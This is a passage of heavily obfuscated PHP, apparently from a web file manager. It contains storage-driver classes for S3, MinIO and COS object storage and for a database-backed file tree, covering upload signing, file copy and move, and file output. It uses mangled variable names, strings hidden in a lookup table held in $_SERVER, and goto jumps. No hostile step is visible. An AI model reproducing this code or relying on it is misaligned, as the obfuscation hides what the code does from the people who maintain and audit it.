ŸÜñ»[217]); $¯¶ü¶ = isset($óÅ¿…ù¯[$® ŸÜñ»[167]]) ? $óÅ¿…ù¯[$® ŸÜñ»[167]] : $® ŸÜñ»[12]; $Î–ãÈØÀ = $óÅ¿…ù¯[$® ŸÜñ»[95]]; unset($óÅ¿…ù¯[$® ŸÜñ»[95]]); if (isset($óÅ¿…ù¯[$® ŸÜñ»[220]])) { $óÅ¿…ù¯[$® ŸÜñ»[219]] = $Ì­ßŠç; return $this->listUploadParts($Î–ãÈØÀ, $óÅ¿…ù¯); } $ˆºÅ¯ÛÃ = array($® ŸÜñ»[221], $® ŸÜñ»[12], $® ŸÜñ»[118], $® ŸÜñ»[12], "\170\55\141\x6d\x7a\55\x64\141\164\x65\72{$Ì­ßŠç}", $® ŸÜñ»[8] . $this->bucket . $® ŸÜñ»[8] . $this->pathEncode($Î–ãÈØÀ) . $¯¶ü¶); if (strpos($¯¶ü¶, $® ŸÜñ»[222]) === 0) { $ˆºÅ¯ÛÃ[0] = $® ŸÜñ»[223]; } if (isset($óÅ¿…ù¯[$® ŸÜñ»[224]]) && $óÅ¿…ù¯[$® ŸÜñ»[224]] == $® ŸÜñ»[225]) { $ˆºÅ¯ÛÃ[0] = $® ŸÜñ»[225]; } $ÎËƒ÷éî = implode($® ŸÜñ»[226], $ˆºÅ¯ÛÃ); $³óğ²– = base64_encode(hash_hmac($® ŸÜñ»[227], $ÎËƒ÷éî, $this->secret, !0)); $ÒÏ¾Êœµ = $® ŸÜñ»[228] . $this->accessKey . $® ŸÜñ»[4] . $³óğ²–; if (strpos($¯¶ü¶, $® ŸÜñ»[222]) === 0) { return array($® ŸÜñ»[229] => $ÒÏ¾Êœµ, $® ŸÜñ»[219] => $Ì­ßŠç); } return $ÒÏ¾Êœµ; } public function listUploadParts($‚äÄÊ–, $¥ñ«Šù = array()) { $Š·Ï÷Çà =& $_SERVER[ì…™Î¶Ï]; $«óóÛ€ = str_replace($Š·Ï÷Çà[230], $Š·Ï÷Çà[12], $¥ñ«Šù[$Š·Ï÷Çà[167]]); $¨Ôúó§ß = $this->client->listParts($this->bucket, $‚äÄÊ–, $«óóÛ€); if (!$¨Ôúó§ß) { return !1; } unset($¥ñ«Šù[$Š·Ï÷Çà[220]], $¥ñ«Šù[$Š·Ï÷Çà[224]]); $¥ñ«Šù[$Š·Ï÷Çà[95]] = $‚äÄÊ–; $Â­İıŠ³ = $this->multiUploadAuthData($‚äÄÊ–, $¥ñ«Šù); if (empty($Â­İıŠ³)) { return !1; } return array($Š·Ï÷Çà[229] => $Â­İıŠ³, $Š·Ï÷Çà[219] => $¥ñ«Šù[$Š·Ï÷Çà[219]], $Š·Ï÷Çà[231] => $¨Ôúó§ß); } public function getHost() { return parent::getHost() . $_SERVER[ì…™Î¶Ï][8] . $this->bucket; } public function size($Ëßã¥·ù) { $È¡Ò‰É = $this->objectMeta($Ëßã¥·ù); return $È¡Ò‰É ? $È¡Ò‰É[$_SERVER[ì…™Î¶Ï][80]] : 0; } public function info($Í¥¨Ò‡) { if ($this->isFolder($Í¥¨Ò‡)) { return $this->folderInfo($Í¥¨Ò‡); } else { if ($this->isFile($Í¥¨Ò‡)) { return $this->fileInfo($Í¥¨Ò‡); } } return !1; } public function exist($÷û©îêÙ) { return $this->isFile($÷û©îêÙ) || $this->isFolder($÷û©îêÙ); } public function isFile($¤Œ×ª °) { return !$this->isFolder($¤Œ×ª °) && $this->objectMeta($¤Œ×ª °); } public function isFolder($úÑøß½¡) { return $this->cacheMethod($_SERVER[ì…™Î¶Ï][198], $úÑøß½¡); } protected function objectMeta($ÂÄ ¦…Ğ) { return $this->cacheMethod($_SERVER[ì…™Î¶Ï][199], $ÂÄ ¦…Ğ); } protected function _objectMeta($¢òÑ–ª«) { $¹ö““ŞŸ =& $_SERVER[ì…™Î¶Ï]; $¢òÑ–ª« = rtrim($¢òÑ–ª«, $¹ö““ŞŸ[8]); try { $¾›±‘ › = $this->client->getObjectInfo($this->bucket, $¢òÑ–ª«); if (!isset($¾›±‘ ›[$¹ö““ŞŸ[216]]) && isset($¾›±‘ ›[$¹ö““ŞŸ[232]])) { $¾›±‘ ›[$¹ö““ŞŸ[216]] = $¾›±‘ ›[$¹ö““ŞŸ[232]]; } } catch (Exception $Ñ´ …Ä ) { $¾›±‘ › = !1; } if (!$¾›±‘ ›) { } return $¾›±‘ ›; } protected function _isFolder($šğ–´çî) { $µŞ©óğ„ =& $_SERVER[ì…™Î¶Ï]; $šğ–´çî = rtrim($šğ–´çî, $µŞ©óğ„[8]); if ($šğ–´çî == $µŞ©óğ„[12] || $šğ–´çî == $µŞ©óğ„[8]) { return !0; } $âˆ‹Ã÷º = $this->client->getBucket($this->bucket, $šğ–´çî, null, 1); if (empty($âˆ‹Ã÷º[$µŞ©óğ„[197]])) { return !1; } $”›æÌğû = $âˆ‹Ã÷º[$µŞ©óğ„[197]][0][$µŞ©óğ„[32]]; return stripos($”›æÌğû, $šğ–´çî . $µŞ©óğ„[8]) === 0 ? !0 : !1; if (substr($”›æÌğû, -1) == $µŞ©óğ„[8]) { return !0; } if (get_path_this($”›æÌğû) == get_path_this($šğ–´çî)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Îí¸àÉí) { parent::__construct($Îí¸àÉí); $this->signatureVersion($_SERVER[ì…™Î¶Ï][211]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto FÇßÅ¹¾æ£; e¸å¢ÙÄË: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($²…„–Ó) { parent::__construct($²…„–Ó); $this->signatureVersion($_SERVER[ì…™Î¶Ï][211]); } public function uploadFormData($±Äç¤ô•, $Åˆá¨Ÿ¾ = 3600) { $¦Â“Ş£Í =& $_SERVER[ì…™Î¶Ï]; $æöåŠš = $¦Â“Ş£Í[191]; $›¶§„ÓÙ = $¦Â“Ş£Í[227]; $±±úÖ– = $¦Â“Ş£Í[1284]; $õ«ø‚Ó° = gmdate($¦Â“Ş£Í[1285], time() + $Åˆá¨Ÿ¾); $ç¿ß¾¢é = (string) time() . $¦Â“Ş£Í[71] . (string) (time() + $Åˆá¨Ÿ¾); $ßØó¸»Š = array($¦Â“Ş£Í[1286] => $õ«ø‚Ó°, $¦Â“Ş£Í[1287] => array(array($¦Â“Ş£Í[1288] => $æöåŠš), array($¦Â“Ş£Í[1289] => $this->bucket), array($¦Â“Ş£Í[1290], $¦Â“Ş£Í[1291], $¦Â“Ş£Í[12]), array($¦Â“Ş£Í[1292] => $±±úÖ–), array($¦Â“Ş£Í[1293] => $›¶§„ÓÙ), array($¦Â“Ş£Í[1294] => $this->accessKey), array($¦Â“Ş£Í[1295] => $ç¿ß¾¢é))); $ßØó¸»Š = json_encode($ßØó¸»Š); $Õú¼–Èğ = hash_hmac($¦Â“Ş£Í[227], $ç¿ß¾¢é, $this->secret); $¯Ú¡©Õì = sha1($ßØó¸»Š); $‡à½Ê¢Á = hash_hmac($¦Â“Ş£Í[227], $¯Ú¡©Õì, $Õú¼–Èğ); $¶äÅŸø = array($¦Â“Ş£Í[1288] => $æöåŠš, $¦Â“Ş£Í[1292] => $±±úÖ–, $¦Â“Ş£Í[1296] => base64_encode($ßØó¸»Š), $¦Â“Ş£Í[1293] => $›¶§„ÓÙ, $¦Â“Ş£Í[1294] => $this->accessKey, $¦Â“Ş£Í[1297] => $ç¿ß¾¢é, $¦Â“Ş£Í[1298] => $‡à½Ê¢Á, $¦Â“Ş£Í[174] => $this->getHost()); return $¶äÅŸø; } public function fileOutLink($ËÓ§…ıš) { $¹¸áæå =& $_SERVER[ì…™Î¶Ï]; if (substr($ËÓ§…ıš, 0, 7) == $¹¸áæå[1299]) { $ËÓ§…ıš = $¹¸áæå[1300] . substr($ËÓ§…ıš, 7); } header($¹¸áæå[158] . $ËÓ§…ıš); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ÆéÍ˜¼¸) { $this->pathParse = $ÆéÍ˜¼¸; $this->model = Model($_SERVER[ì…™Î¶Ï][1301]); } public function getPath($ˆ—‚š¶”) { return trim($ˆ—‚š¶”, $_SERVER[ì…™Î¶Ï][8]); } public function pathFather($ÇĞ¸÷Ò§) { $×Ò”©Ù‘ = $this->parse($ÇĞ¸÷Ò§); $×Ò”©Ù‘ = $this->infoSimple($ÇĞ¸÷Ò§); return $×Ò”©Ù‘ ? $×Ò”©Ù‘[$_SERVER[ì…™Î¶Ï][489]] : !1; } public function pathThis($ºÊî‰èœ) { $ôÔ÷¿ÌŸ = $this->infoSimple($ºÊî‰èœ); return $ôÔ÷¿ÌŸ ? $ôÔ÷¿ÌŸ[$_SERVER[ì…™Î¶Ï][32]] : !1; } public function getPathOuter($ïƒÉÓœÊ) { if (!$ïƒÉÓœÊ) { return $ïƒÉÓœÊ; } $Û´¿°±Á = $this->parse($ïƒÉÓœÊ); return KodIO::make($Û´¿°±Á[$_SERVER[ì…™Î¶Ï][392]]); } public function copyFolderFromIO($¼™ı±ÄŞ, $‹´æ¢™¢, $ÎÃ™•–®, $§Ó–­ÉÇ, $ºÓÛƒÓµ) { $•©¾‚Îº = $this->model->copyFolderFromIO($¼™ı±ÄŞ, $‹´æ¢™¢, $ÎÃ™•–®, $§Ó–­ÉÇ, $ºÓÛƒÓµ); return KodIO::make($•©¾‚Îº); } public function isParentOf($«ù™­ñ¯, $ş ã„öË) { return $this->model->isParentOf($«ù™­ñ¯, $ş ã„öË); } public function mkfile($Œ¤”¹Öì, $ÙÜ„áÎÏ = '', $’ÙÏ‡â = REPEAT_RENAME) { $ÍÉî¢ïó =& $_SERVER[ì…™Î¶Ï]; $Ë–ÜµØ” = $this->parse($Œ¤”¹Öì); $Œ¤”¹Öì = $Ë–ÜµØ”[$ÍÉî¢ïó[392]]; for ($¶ïÄê™ = 0; $¶ïÄê™ < count($Ë–ÜµØ”[$ÍÉî¢ïó[1302]]); $¶ïÄê™++) { $Ñèõ‡ã = $Ë–ÜµØ”[$ÍÉî¢ïó[1302]][$¶ïÄê™]; if ($¶ïÄê™ == count($Ë–ÜµØ”[$ÍÉî¢ïó[1302]]) - 1) { $Œ¤”¹Öì = $this->model->mkfile($Œ¤”¹Öì, $Ñèõ‡ã, $ÙÜ„áÎÏ, $’ÙÏ‡â); break; } $Œ¤”¹Öì = $this->model->mkdir($Œ¤”¹Öì, $Ñèõ‡ã, REPEAT_SKIP); } return $this->getPathOuter($Œ¤”¹Öì); } public function mkdir($­¹Ö€ÌÜ, $æÑşÏá = REPEAT_SKIP) { $¥çÉ«Ì— =& $_SERVER[ì…™Î¶Ï]; $µ¢Üää• = $this->parse($­¹Ö€ÌÜ); $­¹Ö€ÌÜ = $µ¢Üää•[$¥çÉ«Ì—[392]]; for ($¾ÀÕëÓÖ = 0; $¾ÀÕëÓÖ < count($µ¢Üää•[$¥çÉ«Ì—[1302]]); $¾ÀÕëÓÖ++) { $‹¥¦ôê§ = $µ¢Üää•[$¥çÉ«Ì—[1302]][$¾ÀÕëÓÖ]; $­¹Ö€ÌÜ = $this->model->mkdir($­¹Ö€ÌÜ, $‹¥¦ôê§, $æÑşÏá); } return $this->getPathOuter($­¹Ö€ÌÜ); } public function copyFile($†šö’øå, $Éüú§ÊÙ, $÷‰ŒĞÁş = REPEAT_REPLACE) { $–„¨¥üä =& $_SERVER[ì…™Î¶Ï]; $¦¤½ıÎÊ = $this->parse($Éüú§ÊÙ); $× ½Ç„ = $this->model->copy($†šö’øå, $¦¤½ıÎÊ[$–„¨¥üä[392]], $÷‰ŒĞÁş, $¦¤½ıÎÊ[$–„¨¥üä[78]]); return $× ½Ç„ ? $this->getPathOuter($× ½Ç„) : !1; } public function moveFile($İğœ¢±ã, $¨‰Ü¼öŸ, $Ô€±ÅÀ” = REPEAT_REPLACE) { $ÁûÉá =& $_SERVER[ì…™Î¶Ï]; $Æİ—‹Ñ‡ = $this->parse($¨‰Ü¼öŸ); $‰ŸŸŠş = $this->model->move($İğœ¢±ã, $Æİ—‹Ñ‡[$ÁûÉá[392]], $Ô€±ÅÀ”, $Æİ—‹Ñ‡[$ÁûÉá[78]]); return $‰ŸŸŠş ? $this->getPathOuter($‰ŸŸŠş) : !1; } public function copy($øæ¦ ó¨, $Æãê´„ô, $ †œµ¤µ = REPEAT_REPLACE, $¿ø´±­ı = false) { $÷Ï»ß¡ = $this->parse($Æãê´„ô); $ÃÁ°ëÓË = $this->model->copy($øæ¦ ó¨, $÷Ï»ß¡[$_SERVER[ì…™Î¶Ï][392]], $ †œµ¤µ, $¿ø´±­ı); return $ÃÁ°ëÓË ? $this->getPathOuter($ÃÁ°ëÓË) : !1; } public function moveSameAllow() { } public function move($…ñ³ù, $ÍÊÄ‚¡Ò, $ïÄŒğÚ· = REPEAT_REPLACE, $Ä¯¼¤Îà = false) { $İ¼š¶ßÇ = $this->parse($ÍÊÄ‚¡Ò); $Òİé®€Ç = $this->model->move($…ñ³ù, $İ¼š¶ßÇ[$_SERVER[ì…™Î¶Ï][392]], $ïÄŒğÚ·, $Ä¯¼¤Îà); return $Òİé®€Ç ? $this->getPathOuter($Òİé®€Ç) : !1; } public function remove($È˜şËè½, $±èşµğ¿ = true) { return $this->model->remove($È˜şËè½, $±èşµğ¿); } public function rename($Ÿ ¼Êú¢, $ĞÑ–Ÿ€ù) { $æİàŸ¦£ = $this->model->rename($Ÿ ¼Êú¢, $ĞÑ–Ÿ€ù); return $æİàŸ¦£ ? $this->getPathOuter($Ÿ ¼Êú¢) : $æİàŸ¦£; } public function size($³ª¹Û†›) { $¬¹¾”¸ï = $this->infoSimple($³ª¹Û†›); return $¬¹¾”¸ï ? $¬¹¾”¸ï[$_SERVER[ì…™Î¶Ï][80]] : 0; } public function infoSimple($õÅà°ØŸ) { return $this->model->sourceInfo($õÅà°ØŸ); } public function info($£×èÒù¶) { return $this->infoParse($£×èÒù¶); } public function infoAuth($¦õñş“) { return $this->infoParse($¦õñş“, !1, !0); } public function infoWithChildren($©ú ’¬‰) { return $this->infoParse($©ú ’¬‰, !0); } protected function infoParse($ïü£ö»Ñ, $ãÅŠ‡ˆù = false, $Ÿï¦×Ò = false) { if (!$ãÅŠ‡ˆù) { return $this->model->pathInfo($ïü£ö»Ñ, $Ÿï¦×Ò); } return $this->model->pathInfoMore($ïü£ö»Ñ); } public function infoFull($“¶ÊèÃ) { $„‰Î‡–– =& $_SERVER[ì…™Î¶Ï]; $Àš²ˆèú = explode($„‰Î‡––[8], $“¶ÊèÃ); $–½­º¾š = implode($„‰Î‡––[8], array_splice($Àš²ˆèú, 1)); return $this->model->pathInfoByPath($Àš²ˆèú[0], $–½­º¾š); } public function hashSimple($÷ªŸ±âÁ) { $®áÜûÙ =& $_SERVER[ì…™Î¶Ï]; $¾ŠØ¸£ö = $this->infoWithChildren($÷ªŸ±âÁ); return $¾ŠØ¸£ö[$®áÜûÙ[163]][$®áÜûÙ[170]]; } public function hashMd5($ºãÔšüö) { $²â‰Ü©õ =& $_SERVER[ì…™Î¶Ï]; $ÉŞ™ĞùÛ = $this->infoWithChildren($ºãÔšüö); return $ÉŞ™ĞùÛ[$²â‰Ü©õ[163]][$²â‰Ü©õ[169]]; } public function exist($æÉÈ¯£™) { $àù“Ÿ¢ =& $_SERVER[ì…™Î¶Ï]; $µ…»Ó = $this->parse($æÉÈ¯£™); if (!$µ…»Ó[$àù“Ÿ¢[78]]) { return $this->isFile($æÉÈ¯£™) || $this->isFolder($æÉÈ¯£™); } $­®¹ªé = array($àù“Ÿ¢[393] => $µ…»Ó[$àù“Ÿ¢[392]], $àù“Ÿ¢[32] => $µ…»Ó[$àù“Ÿ¢[78]]); $˜¸éã…Ç = $this->model->where($­®¹ªé)->find(); return $˜¸éã…Ç ? !0 : !1; } public function isFile($Å˜½¹Ü¿) { $âİ’„“ =& $_SERVER[ì…™Î¶Ï]; $‰øÒİÆ  = $this->infoSimple($Å˜½¹Ü¿); return $‰øÒİÆ  && $‰øÒİÆ [$âİ’„“[402]] == $âİ’„“[89] ? !1 : !0; } public function isFolder($ÏÆÇÓÑÛ) { $ó¸åá·µ =& $_SERVER[ì…™Î¶Ï]; $ÅÕİª°Ï = $this->infoSimple($ÏÆÇÓÑÛ); return $ÅÕİª°Ï && $ÅÕİª°Ï[$ó¸åá·µ[402]] == $ó¸åá·µ[89] ? !0 : !1; } public function listPath($Àç³äã, $àö¼¡¹» = false) { $ÑˆĞÔ° =& $_SERVER[ì…™Î¶Ï]; if ($Àç³äã == $ÑˆĞÔ°[12]) { return !1; } $ñ»õ’—ñ = array($ÑˆĞÔ°[393] => $Àç³äã); if ($àö¼¡¹») { return $this->model->listSource($ñ»õ’—ñ, -1); } return $this->model->listSource($ñ»õ’—ñ); } public function has($Íá¶òß×, $ªÂäÄÒÍ = false, $ÃºõË = null) { $Ÿ‡ä Î =& $_SERVER[ì…™Î¶Ï]; $·«‚å¤ = $this->infoWithChildren($Íá¶òß×); if ($ªÂäÄÒÍ) { return array($Ÿ‡ä Î[203] => $·«‚å¤[$Ÿ‡ä Î[203]], $Ÿ‡ä Î[202] => $·«‚å¤[$Ÿ‡ä Î[202]]); } return $ÃºõË ? $·«‚å¤[$Ÿ‡ä Î[203]] : $·«‚å¤[$Ÿ‡ä Î[202]]; } public function listAll($óùãİ•ª) { $¡Úî€¨– = IO::info($this->pathParse[$_SERVER[ì…™Î¶Ï][78]]); if (!$¡Úî€¨–) { return array(); } return $this->model->listAll($óùãİ•ª); } public function getContent($Ú‚…©ªİ) { return $this->model->getContent($Ú‚…©ªİ); } public function setContent($¬Ú÷ö÷©, $­­Êêç = '') { return $this->model->setContent($¬Ú÷ö÷©, $­­Êêç); } public function fileSubstr($÷¤§ÒÆ§, $±å‘Ë–Ê, $ïÂÑ¾µ‰) { return $this->model->fileSubstr($÷¤§ÒÆ§, $±å‘Ë–Ê, $ïÂÑ¾µ‰); } public function download($Ø²ÒÕò·, $Õ¸¿Ú©ù = '') { $íğ†İ‰è = get_path_father($Õ¸¿Ú©ù); $ÙÆ¸£á = get_path_this($Õ¸¿Ú©ù); $«µ…¶Å = $this->model->fileInfoGet($Ø²ÒÕò·); $“…ø’¶‘ = IO::copy($«µ…¶Å[$_SERVER[ì…™Î¶Ï][78]], $íğ†İ‰è, !1, $ÙÆ¸£á); return $“…ø’¶‘; } public function setModifyTime($Ş¹‹¤åâ, $Õ–‰£“´ = '') { $Çœ¶¡˜² =& $_SERVER[ì…™Î¶Ï]; if (!$Ş¹‹¤åâ) { return; } $this->model->where(array($Çœ¶¡˜²[409] => $Ş¹‹¤åâ))->save(array($Çœ¶¡˜²[86] => $Õ–‰£“´)); } public function upload($´¾ë¡çå, $À£ìä±, $ñî¾¦éû = false, $º“úİ”¿ = REPEAT_REPLACE) { $Ÿ§ò×´­ =& $_SERVER[ì…™Î¶Ï]; $€¨ÌÊ = $this->parse($´¾ë¡çå); $ ğ©õ˜ = $this->model->addFile($€¨ÌÊ[$Ÿ§ò×´­[392]], $À£ìä±, $€¨ÌÊ[$Ÿ§ò×´­[78]], $ñî¾¦éû, $º“úİ”¿); return $this->getPathOuter($ ğ©õ˜); } public function uploadFileByID($Öæõ¹, $€ƒêı±¥, $ñ‘Áí) { $Ô•˜…¿½ =& $_SERVER[ì…™Î¶Ï]; $¾–Ã«É© = $this->parse($Öæõ¹); $õŸ´ã = $this->model->addFileByFileID($¾–Ã«É©[$Ô•˜…¿½[392]], $€ƒêı±¥, $¾–Ã«É©[$Ô•˜…¿½[78]], $ñ‘Áí); return $this->getPathOuter($õŸ´ã); } public function addFileByRemote($é®øæ¥ä, $ ô¬£¢Ú, $¹µ÷÷£Ì = array(), $°Î½×ôÁ = '', $ğÑªıŸĞ) { $ò¹ú†¡¼ =& $_SERVER[ì…™Î¶Ï]; $ŒÈÎçû² = $this->parse($é®øæ¥ä); $°Î½×ôÁ = empty($°Î½×ôÁ) ? $ŒÈÎçû²[$ò¹ú†¡¼[78]] : $°Î½×ôÁ; $ŞŞÆÚ = $this->model->addFileByRemote($ŒÈÎçû²[$ò¹ú†¡¼[392]], $ ô¬£¢Ú, $°Î½×ôÁ, $¹µ÷÷£Ì, $ğÑªıŸĞ); return $this->getPathOuter($ŞŞÆÚ); } public function uploadLink($²—±Øã, $ç×íØ®‡ = 0) { $ìÕÑ‰˜æ =& $_SERVER[ì…™Î¶Ï]; $’±¢¦îë = $this->parse($²—±Øã); $„£ÅãÏ = _get($GLOBALS[$ìÕÑ‰˜æ[7]], $ìÕÑ‰˜æ[1303]); $ŠüÎÆØ = _get($GLOBALS[$ìÕÑ‰˜æ[7]], $ìÕÑ‰˜æ[1304]); $²—±Øã = Model($ìÕÑ‰˜æ[594])->createFileName($’±¢¦îë[$ìÕÑ‰˜æ[78]], $„£ÅãÏ, $ŠüÎÆØ); return IO::uploadLink($²—±Øã, $ç×íØ®‡); } public function fileNameAuto($çÈî –¡, $¦£ÎŞÆ, $¦â»ÉÃµ = REPEAT_REPLACE, $¬˜öùÑç = false) { return $this->model->fileNameAuto($çÈî –¡, $¦£ÎŞÆ, $¦â»ÉÃµ, $¬˜öùÑç); } public function fileNameExist($ûû«ÕÆŠ, $’ïÒÅĞ„) { return $this->model->fileNameExist($ûû«ÕÆŠ, $’ïÒÅĞ„); } protected function _fileOut($íùÔ©áº, $›ÑÅ·† = false, $Å©ñÉŞ¯ = false, $¿Ò¿Ë¬ø = '', $ÚÓùØ¼ = false) { $ûÅ›ŠÓÑ =& $_SERVER[ì…™Î¶Ï]; $¿Ãš³Ğ” = $this->model->sourceInfo($íùÔ©áº); if ($¿Ãš³Ğ”[$ûÅ›ŠÓÑ[402]] == $ûÅ›ŠÓÑ[89]) { header($ûÅ›ŠÓÑ[1305]); die; } $Ü¿¢úƒ¶ = $this->model->fileInfoGet($íùÔ©áº); $¿Ò¿Ë¬ø = $Ü¿¢úƒ¶[$ûÅ›ŠÓÑ[169]] ? $Ü¿¢úƒ¶[$ûÅ›ŠÓÑ[169]] : $¿Ò¿Ë¬ø; $‚Á©ñ¥£ = isset($GLOBALS[$ûÅ›ŠÓÑ[1306]]) ? $GLOBALS[$ûÅ›ŠÓÑ[1306]] : $¿Ãš³Ğ”[$ûÅ›ŠÓÑ[32]]; if ($ÚÓùØ¼) { return IO::fileOutServer($Ü¿¢úƒ¶[$ûÅ›ŠÓÑ[78]], $›ÑÅ·†, $‚Á©ñ¥£, $¿Ò¿Ë¬ø); } IO::fileOut($Ü¿¢úƒ¶[$ûÅ›ŠÓÑ[78]], $›ÑÅ·†, $‚Á©ñ¥£, $¿Ò¿Ë¬ø); } public function fileOut($Ïú±éøµ, $áüãÒä· = false, $Æˆ‰é’ = false, $Ş½û¯ = '') { $this->_fileOut($Ïú±éøµ, $áüãÒä·, $Æˆ‰é’, $Ş½û¯); } public function fileOutServer($…Í¸Øæ, $Í¿¤§ô– = false, $ØÚºãê¹ = false, $°Šº«¨Œ = '') { $this->_fileOut($…Í¸Øæ, $Í¿¤§ô–, $ØÚºãê¹, $°Šº«¨Œ, !0); } protected function _fileOutImage($¾…—»„å, $€­¿÷Ş = 250) { $·„¹ßÉ‚ =& $_SERVER[ì…™Î¶Ï]; $ÕÊÜŒÅ« = $this->model->pathInfo($¾…—»„å); if ($ÕÊÜŒÅ«[$·„¹ßÉ‚[402]] == $·„¹ßÉ‚[89]) { show_json($·„¹ßÉ‚[1307] . $¾…—»„å, !1); } $®±ÅŞØ = $this->model->fileInfoGet($¾…—»„å); $®±ÅŞØ[$·„¹ßÉ‚[32]] = $ÕÊÜŒÅ«[$·„¹ßÉ‚[32]]; $®±ÅŞØ[$·„¹ßÉ‚[162]] = $ÕÊÜŒÅ«[$·„¹ßÉ‚[162]]; $GLOBALS[$·„¹ßÉ‚[1306]] = $®±ÅŞØ[$·„¹ßÉ‚[32]]; $GLOBALS[$·„¹ßÉ‚[161]] = $®±ÅŞØ; IO::fileOutImage($®±ÅŞØ[$·„¹ßÉ‚[78]], $€­¿÷Ş); } public function fileOutImage($ùÑîìÎˆ, $Ã¸ĞıÏÂ = 250) { $this->_fileOutImage($ùÑîìÎˆ, $Ã¸ĞıÏÂ); } public function fileOutImageServer($Éş¡÷ÒÂ, $¯÷À„¾  = 250) { $this->_fileOutImage($Éş¡÷ÒÂ, $¯÷À„¾ ); } public function link($‰õ¢®Í“, $°ƒéŒ¶í = '') { $ÑùÇşÍ¸ = $this->model->fileInfoGet($‰õ¢®Í“); return IO::link($ÑùÇşÍ¸[$_SERVER[ì…™Î¶Ï][78]], $°ƒéŒ¶í); } protected function parse($Ìşó”) { $ÅĞæß™£ =& $_SERVER[ì…™Î¶Ï]; if (strstr($Ìşó”, $ÅĞæß™£[8]) === !1) { return array($ÅĞæß™£[411] => intval($Ìşó”), $ÅĞæß™£[78] => $ÅĞæß™£[12], $ÅĞæß™£[1302] => array()); } $ÙÎİ¡æ = explode($ÅĞæß™£[8], trim($Ìşó”, $ÅĞæß™£[8])); if (count($ÙÎİ¡æ) < 2) { show_tips(clear_html($Ìşó”) . $ÅĞæß™£[1308]); } return array($ÅĞæß™£[411] => intval($ÙÎİ¡æ[0]), $ÅĞæß™£[78] => $ÙÎİ¡æ[1], $ÅĞæß™£[1302] => array_slice($ÙÎİ¡æ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Àüßºû ) { $this->pathParse = $Àüßºû ; $this->model = Model($_SERVER[ì…™Î¶Ï][1301]); } public function getPathOuter($Ãò´ûüº) { $¹ı‡É…® =& $_SERVER[ì…™Î¶Ï]; if (!$Ãò´ûüº) { return $Ãò´ûüº; } $•ª§ˆÇ = $this->parse($Ãò´ûüº); return trim(KodIO::makeShare($this->pathParse[$¹ı‡É…®[392]], $•ª§ˆÇ[$¹ı‡É…®[392]]), $¹ı‡É…®[8]); } protected function infoParse($¥Şá…åØ, $Ï÷Ü÷ûç = false, $£¸½Éê™ = false) { $ÚßÏá„¿ =& $_SERVER[ì…™Î¶Ï]; $àÒÈ Êé = $this->pathParse[$ÚßÏá„¿[392]]; $ğ€¯€üÛ = trim($this->pathParse[$ÚßÏá„¿[1143]], $ÚßÏá„¿[8]); return Action($ÚßÏá„¿[1309])->sharePathInfo($àÒÈ Êé, $ğ€¯€üÛ, $Ï÷Ü÷ûç); } public function infoFull($Èû»óáÎ) { $Ô’“ªĞÙ =& $_SERVER[ì…™Î¶Ï]; $ØØº¡üÀ = explode($Ô’“ªĞÙ[8], trim($Èû»óáÎ, $Ô’“ªĞÙ[8])); if (count($ØØº¡üÀ) > 1) { $ÑÀØÃÅ = implode($Ô’“ªĞÙ[8], array_splice($ØØº¡üÀ, 1)); $„Â›ìƒŞ = $this->model->pathInfoByPath($ØØº¡üÀ[0], $ÑÀØÃÅ); if (!$„Â›ìƒŞ) { return !1; } $this->pathParse[$Ô’“ªĞÙ[1143]] = $„Â›ìƒŞ[$Ô’“ªĞÙ[394]]; } return $this->infoParse($Èû»óáÎ); } public function listAll($“¸€«Á) { $ÙÇ³¥ í =& $_SERVER[ì…™Î¶Ï]; $ó›ŒÅñ = IO::info($this->pathParse[$ÙÇ³¥ í[78]]); if (!$ó›ŒÅñ) { return array(); } $Å”šÈäŠ = $this->model->listAll($“¸€«Á); $Ï ¤½ğø = Model($ÙÇ³¥ í[586])->getInfo($ó›ŒÅñ[$ÙÇ³¥ í[479]]); $õ•¼É’ = Action($ÙÇ³¥ í[1309]); foreach ($Å”šÈäŠ as &$·ßâœ¸Ì) { check_abort(); $·ßâœ¸Ì[$ÙÇ³¥ í[87]] = $õ•¼É’->_shareItemeParse($·ßâœ¸Ì[$ÙÇ³¥ í[87]], $Ï ¤½ğø); } unset($·ßâœ¸Ì); return $Å”šÈäŠ; } } goto f ­Œ•Çø; F¿‰áœğÌ×: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¢ˆİ¤¬‡) { parent::__construct($¢ˆİ¤¬‡); } public function uploadFormData($İ€øú­, $“©Î‘ = 3600) { $Ãùı—Ÿ› =& $_SERVER[ì…™Î¶Ï]; $€“­¦è³ = $Ãùı—Ÿ›[191]; $¥È÷Ğ‰Ú = $Ãùı—Ÿ›[1322]; $‰È²¹–ß = $Ãùı—Ÿ›[62]; $‘ìò™˜¨ = gmdate($Ãùı—Ÿ›[1323]); $•€šÚËÌ = gmdate($Ãùı—Ÿ›[726]); $‘Ü’›¤´ = $Ãùı—Ÿ›[1324]; $Âïäç¸ = $“©Î‘ . $Ãùı—Ÿ›[12]; $”ù¸¥¯â = $Ãùı—Ÿ›[1284]; $‘ê×Í™ = array($this->accessKey, $•€šÚËÌ, $this->region, $‰È²¹–ß, $‘Ü’›¤´); $úÑêš±ò = implode($Ãùı—Ÿ›[8], $‘ê×Í™); $¤¹Ùºƒö = array($Ãùı—Ÿ›[1286] => gmdate($Ãùı—Ÿ›[1285], strtotime($Ãùı—Ÿ›[1325])), $Ãùı—Ÿ›[1287] => array(array($Ãùı—Ÿ›[1289] => $this->bucket), array($Ãùı—Ÿ›[1288] => $€“­¦è³), array($Ãùı—Ÿ›[1290], $Ãùı—Ÿ›[1291], $Ãùı—Ÿ›[12]), array($Ãùı—Ÿ›[1290], $Ãùı—Ÿ›[1326], $Ãùı—Ÿ›[12]), array($Ãùı—Ÿ›[1290], $Ãùı—Ÿ›[1327], $Ãùı—Ÿ›[12]), array($Ãùı—Ÿ›[1292] => $”ù¸¥¯â), array($Ãùı—Ÿ›[1328] => $úÑêš±ò), array($Ãùı—Ÿ›[1329] => $¥È÷Ğ‰Ú), array($Ãùı—Ÿ›[1330] => $‘ìò™˜¨), array($Ãùı—Ÿ›[1331] => $Âïäç¸))); $‰Ğ©…µ‹ = base64_encode(json_encode($¤¹Ùºƒö)); 